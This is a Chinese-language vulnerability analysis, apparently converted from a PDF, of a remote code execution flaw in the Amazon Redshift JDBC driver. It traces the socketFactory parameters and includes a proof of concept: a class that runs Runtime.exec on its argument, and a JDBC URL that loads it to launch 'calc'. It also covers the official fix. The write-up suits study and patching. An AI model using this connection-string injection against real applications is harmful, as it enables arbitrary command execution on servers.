1
amazon-redshift-jdbc-driver RCE(CVE-OLOO-
QNWOW)
漏洞分析
漏洞复现
漏洞修复
这个漏洞与之前的 pgsql JDBC 漏洞(CVE-2022-21724)是师出同⻔。 
漏洞详细：https://github.com/aws/amazon-redshift-jdbc-driver/security/advisories/GHSA-jc69-
hjw2-fm86 
DriverManager 类建⽴ JDBC 的连接代码如下 
调⽤栈
漏洞分析
package org.example;
import java.sql.DriverManager;
import java.sql.SQLException;
public class App 
{
    public static void main( String[] args ) throws SQLException {
        DriverManager.getConnection("jdbc:redshift://examplecluster.abc123
xyz789.us-west-2.redshift.amazonaws.com:5439/dev?socketFactory=org.exampl
e.atao&socketFactoryArg=calc");
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
Java
复制代码
2
从 SocketFactoryFactory#getSocketFactory ⽅法看起 
25⾏从  info (URL传递的属性)取  socketFactory的值 ，接着30⾏还会
取 socketFactoryArg 的值，如果  socketFactoryArg 值不存在的话就会异常退出。 
接着往下看 ObjectFactory#instantiate ⽅法 
DriverManager#getConnection
Driver#connect
Driver#makeConnection
RedshiftConnectionImpl#RedshiftConnectionImpl
ConnectionFactory#openConnection
ConnectionFactoryImpl#openConnectionImpl
SocketFactoryFactory#getSocketFactory
ObjectFactory#instantiate
1
2
3
4
5
6
7
8
Plain Text
复制代码
3
19⾏通过 Class.forName 加载类，此时 classname 变量是由 socketFactory 传⼊(可控)，所以这⾥可以
是可以加载任意类的。
第⼀个 try ... catch ... 语句直接看 catch 语句，获取 单String 参数的构造⽅法，然后 args 变量会被改为
只有 stringarg 变量的字符串数组，stringarg 变量是由 socketFactoryArg 传⼊(可控)，所以这个String
的内容也是⾃定义的。
最后调⽤ newInstance ⽅法⽣成对象 
这⾥构造⼀个恶意类，代码如下
在⽤⼀开始写的连接代码进⾏利⽤即可
pom.xml 添加依赖 
CVE_2022_41828.java 
漏洞复现
package org.example;
import java.io.IOException;
public class atao {
    public atao(String cmd) throws IOException {
        Runtime.getRuntime().exec(cmd);
    }
}
1
2
3
4
5
6
7
8
9
10
Java
复制代码
      com.amazon.redshift
      redshift-jdbc42
      2.1.0.7
1
2
3
4
5
6
XML
复制代码
4
执⾏截图
链接：https://github.com/aws/amazon-redshift-jdbc-
driver/commit/9999659bbc9f3d006fb02a0bf39d5bcf3b503605
官⽅将原来的强转修改成从⼀开始就限制了class类 
漏洞修复
package cve.test;
import java.sql.DriverManager;
import java.sql.SQLException;
public class CVE_2022_41828
{
    public static void main( String[] args ) throws SQLException {
        DriverManager.getConnection("jdbc:redshift://examplecluster.abc123
xyz789.us-west-2.redshift.amazonaws.com:5439/dev?socketFactory=org.exampl
e.atao&socketFactoryArg=calc");
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
Java
复制代码